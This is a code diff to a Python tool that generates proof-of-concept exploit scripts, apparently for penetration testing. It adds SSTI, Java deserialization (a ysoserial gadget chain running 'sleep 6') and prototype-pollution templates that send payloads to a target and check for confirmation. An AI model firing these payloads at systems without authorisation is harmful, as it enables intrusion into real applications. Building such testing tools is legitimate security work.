@@ -109,6 +109,12 @@ def _generate_python_poc(
         lines.extend(_python_xxe(target, payload, headers))
     elif vuln_type == "rce":
         lines.extend(_python_rce(target, method, parameter, payload, headers))
+    elif vuln_type == "ssti":
+        lines.extend(_python_ssti(target, parameter, payload, headers))
+    elif vuln_type in ("deserialization", "java_deser", "php_deser", "python_deser"):
+        lines.extend(_python_deserialization(target, payload, headers, body))
+    elif vuln_type == "prototype_pollution":
+        lines.extend(_python_prototype_pollution(target, payload, headers))
     else:
         lines.extend(_python_generic(target, method, parameter, payload, headers, body))
 
@@ -315,6 +321,81 @@ def _python_rce(target: str, method: str, param: str, payload: str, headers: dic
         "    print(f'Output: {resp.text[:500]}')",
         "else:",
         "    print('[NOT VULNERABLE] No command execution detected')",
+    ]
+
+
+def _python_ssti(target: str, param: str, payload: str, headers: dict) -> list[str]:
+    h = _format_python_headers(headers)
+    payload = payload or "{{31337*1337}}"
+    expected = "41897569"
+    return [
+        f'TARGET = "{target}"',
+        f'PARAM = "{param or "q"}"',
+        f'PAYLOAD = "{payload}"',
+        f'EXPECTED_RENDER = "{expected}"',
+        "",
+        "import urllib.parse",
+        "encoded = urllib.parse.quote(PAYLOAD)",
+        "url = f'{TARGET}?{PARAM}={encoded}'",
+        f"resp = requests.get(url, headers={h})",
+        "if EXPECTED_RENDER in resp.text:",
+        "    print(f'[CONFIRMED] SSTI: template rendered {PAYLOAD!r} -> {EXPECTED_RENDER}')",
+        "else:",
+        "    print('[NOT CONFIRMED] Expected render not found')",
+        "print(f'Status: {resp.status_code}')",
+        "print(f'Response excerpt: {resp.text[:500]}')",
+    ]
+
+
+def _python_deserialization(target: str, payload: str, headers: dict, body: str) -> list[str]:
+    h = _format_python_headers(headers)
+    return [
+        f'TARGET = "{target}"',
+        "",
+        "# Java deserialization PoC — requires ysoserial.jar",
+        "# Generates CommonsCollections1 gadget chain with sleep(6) command",
+        "import subprocess, time",
+        "try:",
+        "    gadget = subprocess.check_output(",
+        "        ['java', '-jar', 'ysoserial.jar', 'CommonsCollections1', 'sleep 6'],",
+        "        stderr=subprocess.DEVNULL",
+        "    )",
+        "except FileNotFoundError:",
+        "    print('[ERROR] ysoserial.jar not found — download from GitHub')",
+        "    raise SystemExit(1)",
+        "",
+        "start = time.time()",
+        f"resp = requests.post(TARGET, data=gadget, headers={{**{h}, 'Content-Type': 'application/x-java-serialized-object'}})",
+        "elapsed = time.time() - start",
+        "if elapsed >= 5.5:",
+        "    print(f'[CONFIRMED] Deserialization: {elapsed:.1f}s delay (sleep gadget executed)')",
+        "else:",
+        "    print(f'[NOT CONFIRMED] No time delay detected ({elapsed:.1f}s)')",
+    ]
+
+
+def _python_prototype_pollution(target: str, payload: str, headers: dict) -> list[str]:
+    h = _format_python_headers(headers)
+    canary = payload or "kambo_pp_canary_41897569"
+    return [
+        f'TARGET = "{target}"',
+        f'CANARY = "{canary}"',
+        "",
+        "import json",
+        "# Test __proto__ pollution",
+        f"pp_payload = json.dumps({{'__proto__': {{'polluted': CANARY}}, 'name': 'test'}})",
+        f"resp = requests.post(TARGET, data=pp_payload, headers={{**{h}, 'Content-Type': 'application/json'}})",
+        "if CANARY in resp.text:",
+        "    print('[CONFIRMED] Prototype Pollution: canary propagated to response')",
+        "    print(f'Response excerpt: {resp.text[:500]}')",
+        "else:",
+        "    print('[NOT CONFIRMED] Canary not found in response')",
+        "",
+        "# Also test constructor.prototype bypass",
+        f"cp_payload = json.dumps({{'constructor': {{'prototype': {{'polluted': CANARY}}}}, 'name': 'test'}})",
+        f"resp2 = requests.post(TARGET, data=cp_payload, headers={{**{h}, 'Content-Type': 'application/json'}})",
+        "if CANARY in resp2.text:",
+        "    print('[CONFIRMED] Prototype Pollution via constructor.prototype')",
     ]
 
 
